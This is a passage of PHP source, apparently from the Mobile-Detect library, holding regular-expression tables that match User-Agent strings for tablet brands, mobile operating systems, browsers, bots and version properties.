		'TexetTablet'	   => 'NaviPad|TB-772A|TM-7045|TM-7055|TM-9750|TM-7016|TM-7024|TM-7026|TM-7041|TM-7043|TM-7047|TM-8041|TM-9741|TM-9747|TM-9748|TM-9751|TM-7022|TM-7021|TM-7020|TM-7011|TM-7010|TM-7023|TM-7025|TM-7037W|TM-7038W|TM-7027W|TM-9720|TM-9725|TM-9737W|TM-1020|TM-9738W|TM-9740|TM-9743W|TB-807A|TB-771A|TB-727A|TB-725A|TB-719A|TB-823A|TB-805A|TB-723A|TB-715A|TB-707A|TB-705A|TB-709A|TB-711A|TB-890HD|TB-880HD|TB-790HD|TB-780HD|TB-770HD|TB-721HD|TB-710HD|TB-434HD|TB-860HD|TB-840HD|TB-760HD|TB-750HD|TB-740HD|TB-730HD|TB-722HD|TB-720HD|TB-700HD|TB-500HD|TB-470HD|TB-431HD|TB-430HD|TB-506|TB-504|TB-446|TB-436|TB-416|TB-146SE|TB-126SE',
		// Avoid detecting 'PLAYSTATION 3' as mobile.
		'PlaystationTablet' => 'Playstation.*(Portable|Vita)',
		// http://www.trekstor.de/surftabs.html
		'TrekstorTablet'	=> 'ST10416-1|VT10416-1|ST70408-1|ST702xx-1|ST702xx-2|ST80208|ST97216|ST70104-2|VT10416-2|ST10216-2A|SurfTab',
		// http://www.pyleaudio.com/Products.aspx?%2fproducts%2fPersonal-Electronics%2fTablets
		'PyleAudioTablet'   => '\b(PTBL10CEU|PTBL10C|PTBL72BC|PTBL72BCEU|PTBL7CEU|PTBL7C|PTBL92BC|PTBL92BCEU|PTBL9CEU|PTBL9CUK|PTBL9C)\b',
		// http://www.advandigital.com/index.php?link=content-product&jns=JP001
		// because of the short codenames we have to include whitespaces to reduce the possible conflicts.
		'AdvanTablet'	   => 'Android.* \b(E3A|T3X|T5C|T5B|T3E|T3C|T3B|T1J|T1F|T2A|T1H|T1i|E1C|T1-E|T5-A|T4|E1-B|T2Ci|T1-B|T1-D|O1-A|E1-A|T1-A|T3A|T4i)\b ',
		// http://www.danytech.com/category/tablet-pc
		'DanyTechTablet' => 'Genius Tab G3|Genius Tab S2|Genius Tab Q3|Genius Tab G4|Genius Tab Q4|Genius Tab G-II|Genius TAB GII|Genius TAB GIII|Genius Tab S1',
		// http://www.galapad.net/product.html
		'GalapadTablet'	 => 'Android.*\bG1\b(?!\))',
		// http://www.micromaxinfo.com/tablet/funbook
		'MicromaxTablet'	=> 'Funbook|Micromax.*\b(P250|P560|P360|P362|P600|P300|P350|P500|P275)\b',
		// http://www.karbonnmobiles.com/products_tablet.php
		'KarbonnTablet'	 => 'Android.*\b(A39|A37|A34|ST8|ST10|ST7|Smart Tab3|Smart Tab2)\b',
		// http://www.myallfine.com/Products.asp
		'AllFineTablet'	 => 'Fine7 Genius|Fine7 Shine|Fine7 Air|Fine8 Style|Fine9 More|Fine10 Joy|Fine11 Wide',
		// http://www.proscanvideo.com/products-search.asp?itemClass=TABLET&itemnmbr=
		'PROSCANTablet'	 => '\b(PEM63|PLT1023G|PLT1041|PLT1044|PLT1044G|PLT1091|PLT4311|PLT4311PL|PLT4315|PLT7030|PLT7033|PLT7033D|PLT7035|PLT7035D|PLT7044K|PLT7045K|PLT7045KB|PLT7071KG|PLT7072|PLT7223G|PLT7225G|PLT7777G|PLT7810K|PLT7849G|PLT7851G|PLT7852G|PLT8015|PLT8031|PLT8034|PLT8036|PLT8080K|PLT8082|PLT8088|PLT8223G|PLT8234G|PLT8235G|PLT8816K|PLT9011|PLT9045K|PLT9233G|PLT9735|PLT9760G|PLT9770G)\b',
		// http://www.yonesnav.com/products/products.php
		'YONESTablet' => 'BQ1078|BC1003|BC1077|RK9702|BC9730|BC9001|IT9001|BC7008|BC7010|BC708|BC728|BC7012|BC7030|BC7027|BC7026',
		// http://www.cjshowroom.com/eproducts.aspx?classcode=004001001
		// China manufacturer makes tablets for different small brands (eg. http://www.zeepad.net/index.html)
		'ChangJiaTablet'	=> 'TPC7102|TPC7103|TPC7105|TPC7106|TPC7107|TPC7201|TPC7203|TPC7205|TPC7210|TPC7708|TPC7709|TPC7712|TPC7110|TPC8101|TPC8103|TPC8105|TPC8106|TPC8203|TPC8205|TPC8503|TPC9106|TPC9701|TPC97101|TPC97103|TPC97105|TPC97106|TPC97111|TPC97113|TPC97203|TPC97603|TPC97809|TPC97205|TPC10101|TPC10103|TPC10106|TPC10111|TPC10203|TPC10205|TPC10503',
		// http://www.gloryunion.cn/products.asp
		// http://www.allwinnertech.com/en/apply/mobile.html
		// http://www.ptcl.com.pk/pd_content.php?pd_id=284 (EVOTAB)
		// @todo: Softwiner tablets?
		// aka. Cute or Cool tablets. Not sure yet, must research to avoid collisions.
		'GUTablet'		  => 'TX-A1301|TX-M9002|Q702|kf026', // A12R|D75A|D77|D79|R83|A95|A106C|R15|A75|A76|D71|D72|R71|R73|R77|D82|R85|D92|A97|D92|R91|A10F|A77F|W71F|A78F|W78F|W81F|A97F|W91F|W97F|R16G|C72|C73E|K72|K73|R96G
		// http://www.pointofview-online.com/showroom.php?shop_mode=product_listing&category_id=118
		'PointOfViewTablet' => 'TAB-P506|TAB-navi-7-3G-M|TAB-P517|TAB-P-527|TAB-P701|TAB-P703|TAB-P721|TAB-P731N|TAB-P741|TAB-P825|TAB-P905|TAB-P925|TAB-PR945|TAB-PL1015|TAB-P1025|TAB-PI1045|TAB-P1325|TAB-PROTAB[0-9]+|TAB-PROTAB25|TAB-PROTAB26|TAB-PROTAB27|TAB-PROTAB26XL|TAB-PROTAB2-IPS9|TAB-PROTAB30-IPS9|TAB-PROTAB25XXL|TAB-PROTAB26-IPS10|TAB-PROTAB30-IPS10',
		// http://www.overmax.pl/pl/katalog-produktow,p8/tablety,c14/
		// @todo: add more tests.
		'OvermaxTablet'	 => 'OV-(SteelCore|NewBase|Basecore|Baseone|Exellen|Quattor|EduTab|Solution|ACTION|BasicTab|TeddyTab|MagicTab|Stream|TB-08|TB-09)|Qualcore 1027',
		// http://hclmetablet.com/India/index.php
		'HCLTablet'		 => 'HCL.*Tablet|Connect-3G-2.0|Connect-2G-2.0|ME Tablet U1|ME Tablet U2|ME Tablet G1|ME Tablet X1|ME Tablet Y2|ME Tablet Sync',
		// http://www.edigital.hu/Tablet_es_e-book_olvaso/Tablet-c18385.html
		'DPSTablet'		 => 'DPS Dream 9|DPS Dual 7',
		// http://www.visture.com/index.asp
		'VistureTablet'	 => 'V97 HD|i75 3G|Visture V4( HD)?|Visture V5( HD)?|Visture V10',
		// http://www.mijncresta.nl/tablet
		'CrestaTablet'	 => 'CTP(-)?810|CTP(-)?818|CTP(-)?828|CTP(-)?838|CTP(-)?888|CTP(-)?978|CTP(-)?980|CTP(-)?987|CTP(-)?988|CTP(-)?989',
		// MediaTek - http://www.mediatek.com/_en/01_products/02_proSys.php?cata_sn=1&cata1_sn=1&cata2_sn=309
		'MediatekTablet' => '\bMT8125|MT8389|MT8135|MT8377\b',
		// Concorde tab
		'ConcordeTablet' => 'Concorde([ ]+)?Tab|ConCorde ReadMan',
		// GoClever Tablets - http://www.goclever.com/uk/products,c1/tablet,c5/
		'GoCleverTablet' => 'GOCLEVER TAB|A7GOCLEVER|M1042|M7841|M742|R1042BK|R1041|TAB A975|TAB A7842|TAB A741|TAB A741L|TAB M723G|TAB M721|TAB A1021|TAB I921|TAB R721|TAB I720|TAB T76|TAB R70|TAB R76.2|TAB R106|TAB R83.2|TAB M813G|TAB I721|GCTA722|TAB I70|TAB I71|TAB S73|TAB R73|TAB R74|TAB R93|TAB R75|TAB R76.1|TAB A73|TAB A93|TAB A93.2|TAB T72|TAB R83|TAB R974|TAB R973|TAB A101|TAB A103|TAB A104|TAB A104.2|R105BK|M713G|A972BK|TAB A971|TAB R974.2|TAB R104|TAB R83.3|TAB A1042',
		// Modecom Tablets - http://www.modecom.eu/tablets/portal/
		'ModecomTablet' => 'FreeTAB 9000|FreeTAB 7.4|FreeTAB 7004|FreeTAB 7800|FreeTAB 2096|FreeTAB 7.5|FreeTAB 1014|FreeTAB 1001 |FreeTAB 8001|FreeTAB 9706|FreeTAB 9702|FreeTAB 7003|FreeTAB 7002|FreeTAB 1002|FreeTAB 7801|FreeTAB 1331|FreeTAB 1004|FreeTAB 8002|FreeTAB 8014|FreeTAB 9704|FreeTAB 1003',
		// Vonino Tablets
		'VoninoTablet'  => '\b(Argus[ _]?S|Diamond[ _]?79HD|Emerald[ _]?78E|Luna[ _]?70C|Onyx[ _]?S|Onyx[ _]?Z|Orin[ _]?HD|Orin[ _]?S|Otis[ _]?S|SpeedStar[ _]?S|Magnet[ _]?M9|Primus[ _]?94[ _]?3G|Primus[ _]?94HD|Primus[ _]?QS|Android.*\bQ8\b|Sirius[ _]?EVO[ _]?QS|Sirius[ _]?QS|Spirit[ _]?S)\b',
		// ECS Tablets - http://www.ecs.com.tw/ECSWebSite/Product/Product_Tablet_List.aspx?CategoryID=14&MenuID=107&childid=M_107&LanID=0
		'ECSTablet'	 => 'V07OT2|TM105A|S10OT1|TR10CS1',
		// Storex Tablets - http://storex.fr/espace_client/support.html
		// @note: no need to add all the tablet codes since they are guided by the first regex.
		'StorexTablet'  => 'eZee[_\']?(Tab|Go)[0-9]+|TabLC7|Looney Tunes Tab',
		// Generic Vodafone tablets.
		'VodafoneTablet' => 'SmartTab([ ]+)?[0-9]+|SmartTabII10|SmartTabII7|VF-1497|VFD 1400',
		// French tablets - Essentiel B http://www.boulanger.fr/tablette_tactile_e-book/tablette_tactile_essentiel_b/cl_68908.htm?multiChoiceToDelete=brand&mc_brand=essentielb
		// Aka: http://www.essentielb.fr/
		'EssentielBTablet' => 'Smart[ \']?TAB[ ]+?[0-9]+|Family[ \']?TAB2',
		// Ross & Moor - http://ross-moor.ru/
		'RossMoorTablet' => 'RM-790|RM-997|RMD-878G|RMD-974R|RMT-705A|RMT-701|RME-601|RMT-501|RMT-711',
		// i-mobile http://product.i-mobilephone.com/Mobile_Device
		'iMobileTablet'		=> 'i-mobile i-note',
		// http://www.tolino.de/de/vergleichen/
		'TolinoTablet'  => 'tolino tab [0-9.]+|tolino shine',
		// AudioSonic - a Kmart brand
		// http://www.kmart.com.au/webapp/wcs/stores/servlet/Search?langId=-1&storeId=10701&catalogId=10001&categoryId=193001&pageSize=72&currentPage=1&searchCategory=193001%2b4294965664&sortBy=p_MaxPrice%7c1
		'AudioSonicTablet' => '\bC-22Q|T7-QC|T-17B|T-17P\b',
		// AMPE Tablets - http://www.ampe.com.my/product-category/tablets/
		// @todo: add them gradually to avoid conflicts.
		'AMPETablet' => 'Android.* A78 ',
		// Skk Mobile - http://skkmobile.com.ph/product_tablets.php
		'SkkTablet' => 'Android.* (SKYPAD|PHOENIX|CYCLOPS)',
		// Tecno Mobile (only tablet) - http://www.tecno-mobile.com/index.php/product?filterby=smart&list_order=all&page=1
		'TecnoTablet' => 'TECNO P9|TECNO DP8D',
		// JXD (consoles & tablets) - http://jxd.hk/products.asp?selectclassid=009008&clsid=3
		'JXDTablet' => 'Android.* \b(F3000|A3300|JXD5000|JXD3000|JXD2000|JXD300B|JXD300|S5800|S7800|S602b|S5110b|S7300|S5300|S602|S603|S5100|S5110|S601|S7100a|P3000F|P3000s|P101|P200s|P1000m|P200m|P9100|P1000s|S6600b|S908|P1000|P300|S18|S6600|S9100)\b',
		// i-Joy tablets - http://www.i-joy.es/en/cat/products/tablets/
		'iJoyTablet' => 'Tablet (Spirit 7|Essentia|Galatea|Fusion|Onix 7|Landa|Titan|Scooby|Deox|Stella|Themis|Argon|Unique 7|Sygnus|Hexen|Finity 7|Cream|Cream X2|Jade|Neon 7|Neron 7|Kandy|Scape|Saphyr 7|Rebel|Biox|Rebel|Rebel 8GB|Myst|Draco 7|Myst|Tab7-004|Myst|Tadeo Jones|Tablet Boing|Arrow|Draco Dual Cam|Aurix|Mint|Amity|Revolution|Finity 9|Neon 9|T9w|Amity 4GB Dual Cam|Stone 4GB|Stone 8GB|Andromeda|Silken|X2|Andromeda II|Halley|Flame|Saphyr 9,7|Touch 8|Planet|Triton|Unique 10|Hexen 10|Memphis 4GB|Memphis 8GB|Onix 10)',
		// http://www.intracon.eu/tablet
		'FX2Tablet' => 'FX2 PAD7|FX2 PAD10',
		// http://www.xoro.de/produkte/
		// @note: Might be the same brand with 'Simply tablets'
		'XoroTablet'		=> 'KidsPAD 701|PAD[ ]?712|PAD[ ]?714|PAD[ ]?716|PAD[ ]?717|PAD[ ]?718|PAD[ ]?720|PAD[ ]?721|PAD[ ]?722|PAD[ ]?790|PAD[ ]?792|PAD[ ]?900|PAD[ ]?9715D|PAD[ ]?9716DR|PAD[ ]?9718DR|PAD[ ]?9719QR|PAD[ ]?9720QR|TelePAD1030|Telepad1032|TelePAD730|TelePAD731|TelePAD732|TelePAD735Q|TelePAD830|TelePAD9730|TelePAD795|MegaPAD 1331|MegaPAD 1851|MegaPAD 2151',
		// http://www1.viewsonic.com/products/computing/tablets/
		'ViewsonicTablet'   => 'ViewPad 10pi|ViewPad 10e|ViewPad 10s|ViewPad E72|ViewPad7|ViewPad E100|ViewPad 7e|ViewSonic VB733|VB100a',
		// https://www.verizonwireless.com/tablets/verizon/
		'VerizonTablet' => 'QTAQZ3|QTAIR7|QTAQTZ3|QTASUN1|QTASUN2|QTAXIA1',
		// http://www.odys.de/web/internet-tablet_en.html
		'OdysTablet'		=> 'LOOX|XENO10|ODYS[ -](Space|EVO|Xpress|NOON)|\bXELIO\b|Xelio10Pro|XELIO7PHONETAB|XELIO10EXTREME|XELIOPT2|NEO_QUAD10',
		// http://www.captiva-power.de/products.html#tablets-en
		'CaptivaTablet'	 => 'CAPTIVA PAD',
		// IconBIT - http://www.iconbit.com/products/tablets/
		'IconbitTablet' => 'NetTAB|NT-3702|NT-3702S|NT-3702S|NT-3603P|NT-3603P|NT-0704S|NT-0704S|NT-3805C|NT-3805C|NT-0806C|NT-0806C|NT-0909T|NT-0909T|NT-0907S|NT-0907S|NT-0902S|NT-0902S',
		// http://www.teclast.com/topic.php?channelID=70&topicID=140&pid=63
		'TeclastTablet' => 'T98 4G|\bP80\b|\bX90HD\b|X98 Air|X98 Air 3G|\bX89\b|P80 3G|\bX80h\b|P98 Air|\bX89HD\b|P98 3G|\bP90HD\b|P89 3G|X98 3G|\bP70h\b|P79HD 3G|G18d 3G|\bP79HD\b|\bP89s\b|\bA88\b|\bP10HD\b|\bP19HD\b|G18 3G|\bP78HD\b|\bA78\b|\bP75\b|G17s 3G|G17h 3G|\bP85t\b|\bP90\b|\bP11\b|\bP98t\b|\bP98HD\b|\bG18d\b|\bP85s\b|\bP11HD\b|\bP88s\b|\bA80HD\b|\bA80se\b|\bA10h\b|\bP89\b|\bP78s\b|\bG18\b|\bP85\b|\bA70h\b|\bA70\b|\bG17\b|\bP18\b|\bA80s\b|\bA11s\b|\bP88HD\b|\bA80h\b|\bP76s\b|\bP76h\b|\bP98\b|\bA10HD\b|\bP78\b|\bP88\b|\bA11\b|\bA10t\b|\bP76a\b|\bP76t\b|\bP76e\b|\bP85HD\b|\bP85a\b|\bP86\b|\bP75HD\b|\bP76v\b|\bA12\b|\bP75a\b|\bA15\b|\bP76Ti\b|\bP81HD\b|\bA10\b|\bT760VE\b|\bT720HD\b|\bP76\b|\bP73\b|\bP71\b|\bP72\b|\bT720SE\b|\bC520Ti\b|\bT760\b|\bT720VE\b|T720-3GE|T720-WiFi',
		// Onda - http://www.onda-tablet.com/buy-android-onda.html?dir=desc&limit=all&order=price
		'OndaTablet' => '\b(V975i|Vi30|VX530|V701|Vi60|V701s|Vi50|V801s|V719|Vx610w|VX610W|V819i|Vi10|VX580W|Vi10|V711s|V813|V811|V820w|V820|Vi20|V711|VI30W|V712|V891w|V972|V819w|V820w|Vi60|V820w|V711|V813s|V801|V819|V975s|V801|V819|V819|V818|V811|V712|V975m|V101w|V961w|V812|V818|V971|V971s|V919|V989|V116w|V102w|V973|Vi40)\b[\s]+|V10 \b4G\b',
		'JaytechTablet'	 => 'TPC-PA762',
		'BlaupunktTablet'   => 'Endeavour 800NG|Endeavour 1010',
		// http://www.digma.ru/support/download/
		// @todo: Ebooks also (if requested)
		'DigmaTablet' => '\b(iDx10|iDx9|iDx8|iDx7|iDxD7|iDxD8|iDsQ8|iDsQ7|iDsQ8|iDsD10|iDnD7|3TS804H|iDsQ11|iDj7|iDs10)\b',
		// http://www.evolioshop.com/ro/tablete-pc.html
		// http://www.evolio.ro/support/downloads_static.html?cat=2
		// @todo: Research some more
		'EvolioTablet' => 'ARIA_Mini_wifi|Aria[ _]Mini|Evolio X10|Evolio X7|Evolio X8|\bEvotab\b|\bNeura\b',
		// @todo http://www.lavamobiles.com/tablets-data-cards
		'LavaTablet' => 'QPAD E704|\bIvoryS\b|E-TAB IVORY|\bE-TAB\b',
		// http://www.breezetablet.com/
		'AocTablet' => 'MW0811|MW0812|MW0922|MTK8382|MW1031|MW0831|MW0821|MW0931|MW0712',
		// http://www.mpmaneurope.com/en/products/internet-tablets-14/android-tablets-14/
		'MpmanTablet' => 'MP11 OCTA|MP10 OCTA|MPQC1114|MPQC1004|MPQC994|MPQC974|MPQC973|MPQC804|MPQC784|MPQC780|\bMPG7\b|MPDCG75|MPDCG71|MPDC1006|MP101DC|MPDC9000|MPDC905|MPDC706HD|MPDC706|MPDC705|MPDC110|MPDC100|MPDC99|MPDC97|MPDC88|MPDC8|MPDC77|MP709|MID701|MID711|MID170|MPDC703|MPQC1010',
		// https://www.celkonmobiles.com/?_a=categoryphones&sid=2
		'CelkonTablet' => 'CT695|CT888|CT[\s]?910|CT7 Tab|CT9 Tab|CT3 Tab|CT2 Tab|CT1 Tab|C820|C720|\bCT-1\b',
		// http://www.wolderelectronics.com/productos/manuales-y-guias-rapidas/categoria-2-miTab
		'WolderTablet' => 'miTab \b(DIAMOND|SPACE|BROOKLYN|NEO|FLY|MANHATTAN|FUNK|EVOLUTION|SKY|GOCAR|IRON|GENIUS|POP|MINT|EPSILON|BROADWAY|JUMP|HOP|LEGEND|NEW AGE|LINE|ADVANCE|FEEL|FOLLOW|LIKE|LINK|LIVE|THINK|FREEDOM|CHICAGO|CLEVELAND|BALTIMORE-GH|IOWA|BOSTON|SEATTLE|PHOENIX|DALLAS|IN 101|MasterChef)\b',
		'MediacomTablet' => 'M-MPI10C3G|M-SP10EG|M-SP10EGP|M-SP10HXAH|M-SP7HXAH|M-SP10HXBH|M-SP8HXAH|M-SP8MXA',
		// http://www.mi.com/en
		'MiTablet' => '\bMI PAD\b|\bHM NOTE 1W\b',
		// http://www.nbru.cn/index.html
		'NibiruTablet' => 'Nibiru M1|Nibiru Jupiter One',
		// http://navroad.com/products/produkty/tablety/
		// http://navroad.com/products/produkty/tablety/
		'NexoTablet' => 'NEXO NOVA|NEXO 10|NEXO AVIO|NEXO FREE|NEXO GO|NEXO EVO|NEXO 3G|NEXO SMART|NEXO KIDDO|NEXO MOBI',
		// http://leader-online.com/new_site/product-category/tablets/
		// http://www.leader-online.net.au/List/Tablet
		'LeaderTablet' => 'TBLT10Q|TBLT10I|TBL-10WDKB|TBL-10WDKBO2013|TBL-W230V2|TBL-W450|TBL-W500|SV572|TBLT7I|TBA-AC7-8G|TBLT79|TBL-8W16|TBL-10W32|TBL-10WKB|TBL-W100',
		// http://www.datawind.com/ubislate/
		'UbislateTablet' => 'UbiSlate[\s]?7C',
		// http://www.pocketbook-int.com/ru/support
		'PocketBookTablet' => 'Pocketbook',
		// http://www.kocaso.com/product_tablet.html
		'KocasoTablet' => '\b(TB-1207)\b',
		// http://global.hisense.com/product/asia/tablet/Sero7/201412/t20141215_91832.htm
		'HisenseTablet' => '\b(F5281|E2371)\b',
		// http://www.tesco.com/direct/hudl/
		'Hudl'			  => 'Hudl HT7S3|Hudl 2',
		// http://www.telstra.com.au/home-phone/thub-2/
		'TelstraTablet'	 => 'T-Hub2',
		'GenericTablet'	 => 'Android.*\b97D\b|Tablet(?!.*PC)|BNTV250A|MID-WCDMA|LogicPD Zoom2|\bA7EB\b|CatNova8|A1_07|CT704|CT1002|\bM721\b|rk30sdk|\bEVOTAB\b|M758A|ET904|ALUMIUM10|Smartfren Tab|Endeavour 1010|Tablet-PC-4|Tagi Tab|\bM6pro\b|CT1020W|arc 10HD|\bTP750\b|\bQTAQZ3\b|WVT101|TM1088|KT107'
	);
	protected static $operatingSystems = array(
		'AndroidOS'		 => 'Android',
		'BlackBerryOS'	  => 'blackberry|\bBB10\b|rim tablet os',
		'PalmOS'			=> 'PalmOS|avantgo|blazer|elaine|hiptop|palm|plucker|xiino',
		'SymbianOS'		 => 'Symbian|SymbOS|Series60|Series40|SYB-[0-9]+|\bS60\b',
		// @reference: http://en.wikipedia.org/wiki/Windows_Mobile
		'WindowsMobileOS'   => 'Windows CE.*(PPC|Smartphone|Mobile|[0-9]{3}x[0-9]{3})|Windows Mobile|Windows Phone [0-9.]+|WCE;',
		// @reference: http://en.wikipedia.org/wiki/Windows_Phone
		// http://wifeng.cn/?r=blog&a=view&id=106
		// http://nicksnettravels.builttoroam.com/post/2011/01/10/Bogus-Windows-Phone-7-User-Agent-String.aspx
		// http://msdn.microsoft.com/library/ms537503.aspx
		// https://msdn.microsoft.com/en-us/library/hh869301(v=vs.85).aspx
		'WindowsPhoneOS'   => 'Windows Phone 10.0|Windows Phone 8.1|Windows Phone 8.0|Windows Phone OS|XBLWP7|ZuneWP7|Windows NT 6.[23]; ARM;',
		'iOS'			   => '\biPhone.*Mobile|\biPod|\biPad|AppleCoreMedia',
		// https://en.wikipedia.org/wiki/IPadOS
		'iPadOS' => 'CPU OS 13',
		// http://en.wikipedia.org/wiki/MeeGo
		// @todo: research MeeGo in UAs
		'MeeGoOS'		   => 'MeeGo',
		// http://en.wikipedia.org/wiki/Maemo
		// @todo: research Maemo in UAs
		'MaemoOS'		   => 'Maemo',
		'JavaOS'			=> 'J2ME/|\bMIDP\b|\bCLDC\b', // '|Java/' produces bug #135
		'webOS'			 => 'webOS|hpwOS',
		'badaOS'			=> '\bBada\b',
		'BREWOS'			=> 'BREW',
	);
	protected static $browsers = array(
		//'Vivaldi'		 => 'Vivaldi',
		// @reference: https://developers.google.com/chrome/mobile/docs/user-agent
		'Chrome'		  => '\bCrMo\b|CriOS|Android.*Chrome/[.0-9]* (Mobile)?',
		'Dolfin'		  => '\bDolfin\b',
		'Opera'		   => 'Opera.*Mini|Opera.*Mobi|Android.*Opera|Mobile.*OPR/[0-9.]+$|Coast/[0-9.]+',
		'Skyfire'		 => 'Skyfire',
		'Edge'			 => 'Mobile Safari/[.0-9]* Edge',
		'IE'			  => 'IEMobile|MSIEMobile', // |Trident/[.0-9]+
		'Firefox'		 => 'fennec|firefox.*maemo|(Mobile|Tablet).*Firefox|Firefox.*Mobile|FxiOS',
		'Bolt'			=> 'bolt',
		'TeaShark'		=> 'teashark',
		'Blazer'		  => 'Blazer',
		// @reference: http://developer.apple.com/library/safari/#documentation/AppleApplications/Reference/SafariWebContent/OptimizingforSafarioniPhone/OptimizingforSafarioniPhone.html#//apple_ref/doc/uid/TP40006517-SW3
		'Safari'		  => 'Version.*Mobile.*Safari|Safari.*Mobile|MobileSafari',
		// http://en.wikipedia.org/wiki/Midori_(web_browser)
		//'Midori'		  => 'midori',
		//'Tizen'		   => 'Tizen',
		'WeChat'		  => '\bMicroMessenger\b',
		'UCBrowser'	   => 'UC.*Browser|UCWEB',
		'baiduboxapp'	 => 'baiduboxapp',
		'baidubrowser'	=> 'baidubrowser',
		// https://github.com/serbanghita/Mobile-Detect/issues/7
		'DiigoBrowser'	=> 'DiigoBrowser',
		// http://www.puffinbrowser.com/index.php
		// https://github.com/serbanghita/Mobile-Detect/issues/752
		// 'Puffin'			=> 'Puffin',
		// http://mercury-browser.com/index.html
		'Mercury'		  => '\bMercury\b',
		// http://en.wikipedia.org/wiki/Obigo_Browser
		'ObigoBrowser' => 'Obigo',
		// http://en.wikipedia.org/wiki/NetFront
		'NetFront' => 'NF-Browser',
		// @reference: http://en.wikipedia.org/wiki/Minimo
		// http://en.wikipedia.org/wiki/Vision_Mobile_Browser
		'GenericBrowser'  => 'NokiaBrowser|OviBrowser|OneBrowser|TwonkyBeamBrowser|SEMC.*Browser|FlyFlow|Minimo|NetFront|Novarra-Vision|MQQBrowser|MicroMessenger',
		// @reference: https://en.wikipedia.org/wiki/Pale_Moon_(web_browser)
		'PaleMoon'		=> 'Android.*PaleMoon|Mobile.*PaleMoon',
	);
	protected static $utilities = array(
		// Experimental. When a mobile device wants to switch to 'Desktop Mode'.
		// http://scottcate.com/technology/windows-phone-8-ie10-desktop-or-mobile/
		// https://github.com/serbanghita/Mobile-Detect/issues/57#issuecomment-15024011
		// https://developers.facebook.com/docs/sharing/best-practices
		'Bot'		 => 'Googlebot|facebookexternalhit|Google-AMPHTML|s~amp-validator|AdsBot-Google|Google Keyword Suggestion|Facebot|YandexBot|YandexMobileBot|bingbot|ia_archiver|AhrefsBot|Ezooms|GSLFbot|WBSearchBot|Twitterbot|TweetmemeBot|Twikle|PaperLiBot|Wotbox|UnwindFetchor|Exabot|MJ12bot|YandexImages|TurnitinBot|Pingdom|contentkingapp',
		'MobileBot'   => 'Googlebot-Mobile|AdsBot-Google-Mobile|YahooSeeker/M1A1-R2D2',
		'DesktopMode' => 'WPDesktop',
		'TV'		  => 'SonyDTV|HbbTV', // experimental
		'WebKit'	  => '(webkit)[ /]([\w.]+)',
		// @todo: Include JXD consoles.
		'Console'	 => '\b(Nintendo|Nintendo WiiU|Nintendo 3DS|Nintendo Switch|PLAYSTATION|Xbox)\b',
		'Watch'	   => 'SM-V700',
	);
	protected static $uaHttpHeaders = array(
		// The default User-Agent string.
		'HTTP_USER_AGENT',
		// Header can occur on devices using Opera Mini.
		'HTTP_X_OPERAMINI_PHONE_UA',
		// Vodafone specific header: http://www.seoprinciple.com/mobile-web-community-still-angry-at-vodafone/24/
		'HTTP_X_DEVICE_USER_AGENT',
		'HTTP_X_ORIGINAL_USER_AGENT',
		'HTTP_X_SKYFIRE_PHONE',
		'HTTP_X_BOLT_PHONE_UA',
		'HTTP_DEVICE_STOCK_UA',
		'HTTP_X_UCBROWSER_DEVICE_UA'
	);
	protected static $properties = array(
		// Build
		'Mobile'		=> 'Mobile/[VER]',
		'Build'		 => 'Build/[VER]',
		'Version'	   => 'Version/[VER]',
		'VendorID'	  => 'VendorID/[VER]',
		// Devices
		'iPad'		  => 'iPad.*CPU[a-z ]+[VER]',
		'iPhone'		=> 'iPhone.*CPU[a-z ]+[VER]',
		'iPod'		  => 'iPod.*CPU[a-z ]+[VER]',
		//'BlackBerry'	=> array('BlackBerry[VER]', 'BlackBerry [VER];'),
		'Kindle'		=> 'Kindle/[VER]',
		// Browser
		'Chrome'		=> array('Chrome/[VER]', 'CriOS/[VER]', 'CrMo/[VER]'),
		'Coast'		 => array('Coast/[VER]'),
		'Dolfin'		=> 'Dolfin/[VER]',
		// @reference: https://developer.mozilla.org/en-US/docs/Web/HTTP/Headers/User-Agent/Firefox
		'Firefox'	   => array('Firefox/[VER]', 'FxiOS/[VER]'), 
		'Fennec'		=> 'Fennec/[VER]',
		// http://msdn.microsoft.com/en-us/library/ms537503(v=vs.85).aspx
		// https://msdn.microsoft.com/en-us/library/ie/hh869301(v=vs.85).aspx
		'Edge' => 'Edge/[VER]',
		'IE'	  => array('IEMobile/[VER];', 'IEMobile [VER]', 'MSIE [VER];', 'Trident/[0-9.]+;.*rv:[VER]'),
		// http://en.wikipedia.org/wiki/NetFront
		'NetFront'	  => 'NetFront/[VER]',
		'NokiaBrowser'  => 'NokiaBrowser/[VER]',
		'Opera'		 => array( ' OPR/[VER]', 'Opera Mini/[VER]', 'Version/[VER]' ),
		'Opera Mini'	=> 'Opera Mini/[VER]',
		'Opera Mobi'	=> 'Version/[VER]',
		'UCBrowser'	=> array( 'UCWEB[VER]', 'UC.*Browser/[VER]' ),
		'MQQBrowser'	=> 'MQQBrowser/[VER]',
		'MicroMessenger' => 'MicroMessenger/[VER]',
		'baiduboxapp'   => 'baiduboxapp/[VER]',
		'baidubrowser'  => 'baidubrowser/[VER]',
		'SamsungBrowser' => 'SamsungBrowser/[VER]',
		'Iron'		  => 'Iron/[VER]',
		// @note: Safari 7534.48.3 is actually Version 5.1.
		// @note: On BlackBerry the Version is overwriten by the OS.
		'Safari'		=> array( 'Version/[VER]', 'Safari/[VER]' ),
		'Skyfire'	   => 'Skyfire/[VER]',
		'Tizen'		 => 'Tizen/[VER]',
		'Webkit'		=> 'webkit[ /][VER]',
		'PaleMoon'		 => 'PaleMoon/[VER]',
		// Engine
		'Gecko'		 => 'Gecko/[VER]',
		'Trident'	   => 'Trident/[VER]',
		'Presto'		=> 'Presto/[VER]',
		'Goanna'		   => 'Goanna/[VER]',
		// OS
		'iOS'			  => ' \bi?OS\b [VER][ ;]{1}',
		'Android'		  => 'Android [VER]',
		'BlackBerry'	   => array('BlackBerry[\w]+/[VER]', 'BlackBerry.*Version/[VER]', 'Version/[VER]'),
		'BREW'			 => 'BREW [VER]',
		'Java'			 => 'Java/[VER]',
		// @reference: http://windowsteamblog.com/windows_phone/b/wpdev/archive/2011/08/29/introducing-the-ie9-on-windows-phone-mango-user-agent-string.aspx
		// @reference: http://en.wikipedia.org/wiki/Windows_NT#Releases
		'Windows Phone OS' => array( 'Windows Phone OS [VER]', 'Windows Phone [VER]'),
		'Windows Phone'	=> 'Windows Phone [VER]',
		'Windows CE'	   => 'Windows CE/[VER]',
		// http://social.msdn.microsoft.com/Forums/en-US/windowsdeveloperpreviewgeneral/thread/6be392da-4d2f-41b4-8354-8dcee20c85cd
		'Windows NT'	   => 'Windows NT [VER]',
		'Symbian'		  => array('SymbianOS/[VER]', 'Symbian/[VER]'),
